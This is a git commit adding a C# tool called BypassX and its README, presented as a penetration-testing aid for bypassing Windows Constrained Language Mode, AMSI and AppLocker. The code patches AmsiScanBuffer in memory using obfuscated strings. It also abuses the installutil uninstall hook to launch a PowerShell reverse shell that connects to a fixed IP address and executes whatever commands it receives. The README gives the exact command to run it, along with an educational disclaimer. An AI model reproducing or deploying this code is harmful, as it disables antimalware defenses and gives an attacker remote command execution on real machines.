05c005d726acb20f20c8ba0940b513d0a0253f49
vulnableone <141920364+vulnableone@users.noreply.github.com>
2024-03-07 23:40:50 +0700

    Commit

---
+++ BypassX/Program.cs
@@ -0,0 +1,76 @@
+﻿using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+
+namespace Bypass
+{
+    class Program
+    {
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Bypassing CLM");
+        }
+
+        public static int bypassAMSI()
+        {
+            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
+            String funcName = string.Join("", chars);
+
+            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
+            String libName = string.Join("", chars2);
+
+            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);
+
+            Byte[] Patchx64 = new byte[] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };
+
+            uint p = 0;
+
+            VirtualProtect(Address, (UIntPtr)3, 0x40, out p);
+            Marshal.Copy(Patchx64, 0, Address, 12);
+
+
+            return 0;
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Program.bypassAMSI();
+            using (PowerShell ps = PowerShell.Create())
+            {
+
+                string commmand = @"$client = New-Object System.Net.Sockets.TCPClient('192.168.19.134',8080);
+                                    $stream = $client.GetStream();
+                                    [byte[]]$bytes = 0..65535|%{0};
+                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+                                    {
+                                        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                                        $sendback = (iex $data 2>&1 | Out-String );
+                                        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+                                        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+                                        $stream.Write($sendbyte,0,$sendbyte.Length);
+                                        $stream.Flush();
+                                    }
+                                    $client.Close();";
+
+                ps.AddScript(commmand);
+                ps.Invoke();
+            }
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,22 @@
+# ByassX
+This tools is designed to help security researchers and penetration testers evaluate and bypass various security features in the Windows operating system and identify potential weaknesses in the organization, including:
+1- Constrained Language Mode
+2- AMSI (AntiMalware Scan Interface)
+3- AppLocker
+
+**Usage:**
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U BypassX.exe
+```
+
+# Demonstration
+
+Testing on Windows 11
+
+![image](https://github.com/vulnableone/BypassX/assets/141920364/f359f523-909d-4336-8b36-8e8cd2be00a0)
+
+![image](https://github.com/vulnableone/BypassX/assets/141920364/199bfa1d-113e-47b3-9d7c-f54b2d4b4751)
+
+# ⚠️ Disclaimer:
+The information contained in this post is for educational and research purposes only. It is not intended to be used for malicious purposes. 
+This is a post to educate users on cyber security awareness and penetration testing to protect against real attacker.
